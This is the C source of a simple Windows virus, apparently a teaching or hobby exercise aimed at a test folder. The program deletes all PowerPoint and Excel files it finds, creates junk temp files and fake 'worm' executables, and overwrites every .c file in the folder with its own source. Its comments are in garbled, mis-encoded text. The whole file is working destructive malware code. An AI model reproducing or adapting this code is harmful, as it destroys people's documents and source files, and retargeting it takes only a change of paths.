#include<stdio.h>
#include<io.h>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
#define CREATE1 "H:\\virus\\virus_test\\worm1.exe"
#define CREATE2 "H:\\virus\\virus_test\\worm2.exe"
#define Target "H:\\virus\\virus_test\\*.c"
#define Virus "H:\\virus\\virus_create.c"
#define DELETE1 "H:\\virus\\virus_test\\*.pptx"
#define DELETE2 "H:\\virus\\virus_test\\*.xlsx"
#define ipath "H:\\virus\\virus_test"

void EXE_CREATE(void);
void REMOVE(void);
void TRASH(void);
void COPYFILE(char* infile, char *outfile);
void INFECTED(void);

void EXE_CREATE(void)
{
	int i;
	char* s[2] = { CREATE1,CREATE2 };
	for (i = 0; i < 2; i++)
	{
		open(s[i], 0x0100, 0x0080);
		COPYFILE(Virus, s[i]);
	}
}
void REMOVE(void)
{
	int done;//��ɱ�־ 
	int i;//���� 

	struct _finddata_t fd;//��������ļ��Ľṹ�壬������Ѿ���io.h���У�������_finddata_t,_findfirst,_findnext,_findclose 
	char *filetype[2] = { DELETE1,DELETE2 };//����Ҫɾ���������ļ�����Ϊdelete1 ��delete 2
	for (i = 0; i < 2; i++)//��������ļ���չ���Ƿ���϶����е�.xlsx��.pptx 
	{
		done = _findfirst(filetype[i], &fd);//��һ�β��� 
		if (done != -1)//�ɹ�ɾ���ļ��ı�־ 
		{
			printf("ɾ�� %s\n", fd.name);//ɾ�����ļ��� 
			remove(fd.name);//ɾ���ļ����ж�Ӧ�ļ� 
			while (!_findnext(done, &fd))//�ɹ�ɾ���ڶ����ļ����ļ��� 
			{
				printf("ɾ�� %s\n", fd.name);
				remove(fd.name);
			}
		}
		_findclose(done);// ɾ����ϣ����ҽ��� 
	}
}

void TRASH(void)//�����ļ� 
{
	int i = 0;
	FILE *fp = NULL;
	char* path = NULL;
	char* NewName = NULL;
	char tempname[] = "XXXXXXXXX";//�����ļ��� 
	path = ipath;
	if (!_chdir(path))//���ұ���Ⱦ�ļ�����·�� 
	{
		printf("�ɹ���Ŀ¼\n");
	}
	else
	{
		printf("��Ŀ¼ʧ��\n");
		perror("����: ");
	}
	NewName = _mktemp(tempname);
	fp = fopen(NewName, "w");//���ļ���д���ļ����ݣ������� 
	fclose(fp);

}
void INFECTED(void)
{
	int done;
	int i;

	struct _finddata_t fd;
	char *filetype = Target;

	done = _findfirst(filetype, &fd);
	COPYFILE(Virus, fd.name);
	while (!_findnext(done, &fd))
	{
		COPYFILE(Virus, fd.name); 
	}
	_findclose(done);
}

void COPYFILE(char* infile, char *outfile)
{
	FILE *in, *out;
	in = fopen(infile, "r");
	out = fopen(outfile, "w");
	while (!feof(in))
	{
		fputc(fgetc(in), out);
	}
	fclose(in);
	fclose(out);
}


int main(void)
{
	TRASH();            
    EXE_CREATE();            
	REMOVE();              
	INFECTED();             
	system("pause");
	return 0;
}

